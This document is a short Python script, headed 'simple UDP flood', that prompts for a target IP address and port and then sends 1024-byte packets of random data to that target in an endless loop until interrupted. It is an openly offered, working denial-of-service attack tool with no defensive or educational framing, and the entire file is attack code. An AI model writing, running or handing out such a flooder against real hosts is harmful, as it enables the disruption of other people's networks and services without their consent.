# simple UDP flood

import sys
import socket
import random


s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1024)
ip = input('[!] Target IP: ')
sent = 0

try:
	port = int(input('[!] Target Port: '))

except ValueError:
	print("[!] Invalid input, quitting...")
	sys.exit(0)

try:
	while True:
		s.sendto(bytes,(ip,port))
		print("[*] Sent {} packets to {} on port {}".format(sent,ip,port))
		sent = sent +1

except KeyboardInterrupt:
	print('Bye !\n')
